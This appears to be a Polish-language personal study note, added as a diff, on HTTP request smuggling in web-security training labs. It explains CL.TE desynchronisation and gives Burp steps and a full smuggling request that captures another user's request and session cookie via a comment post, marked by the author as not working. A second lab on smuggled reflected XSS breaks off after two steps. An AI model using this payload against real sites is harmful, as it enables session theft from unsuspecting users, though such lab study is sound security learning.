@@ -1,0 +1,88 @@
+Na czym polega atak?
+W internecie requesty często przechodzą przez dwa serwery:
+Przeglądarka → Frontend (proxy/CDN) → Backend
+Problem pojawia się gdy frontend i backend inaczej interpretują gdzie kończy się jeden request a zaczyna drugi.
+
+
+___
+Dwa nagłówki określają długość requestu
+
+Content-Length – mówi ile bajtów ma body
+Transfer-Encoding: chunked – body podzielone na kawałki, kończy się 0
+
+Gdy serwery się nie zgadzają → można przemycić początek następnego requestu!
+___
+
+
+
+
+
+
+
+
+
+
+Lab: Exploiting HTTP request smuggling to capture other users' requests - NIE DZIAŁA
+
+
+
+
+Cel tego laba
+Przechwycić request innego użytkownika (np. z jego session cookie) poprzez przemycenie początku requestu który "połknie" jego dane.
+Wysyłasz jeden request który zawiera ukryty drugi request – backend "dokłeja" go do następnego requestu który przyjdzie od ofiary.
+
+Plan działania
+1. Wykrycie typu smugglingu 
+2. Potwierdzenie podatności
+3. Exploit – przechwycenie requestu ofiary
+
+
+GO:
+1. Detekcja - bez logowania
+Burp Extension HTTP Request Smuggling > wybieram request > Smuggle Probe (CL.TE)
+2. Bez logowania dodaj koemtarz i znajdz w historii POST /comment
+3. zmień body tak by comment był ostatni w całym query:
+csrf=nv1cQMJWtQKdQFLKXp8Jnq4hlmhgIUjh&postId=1&name=ccc&email=c%40c.pl&website=http%3A%2F%2Faaa.pl&comment=xxx
+4. ustaiwenia burp, wylacz (Bez tego Burp nadpisze Twój payload!):
+❌ Update Content-Length
+❌ Normalize HTTP/1 line endings
+5. Request:
+
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+
+
+
+
+Ad.1 Detekcja
+
+Frontend widzi:  Content-Length: 6  → wysyła 6 bajtów do backendu
+Backend widzi:   Transfer-Encoding: chunked → czeka na chunk "0" który nigdy nie przychodzi
+Backend czeka... timeout → DELAYED RESPONSE
+Ta zwłoka w odpowiedzi to potwierdzenie podatności! ✅
+
+
+
+
+
+
+
+Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+
+1. no login > add comment
+2. burp repeater > 
+
+
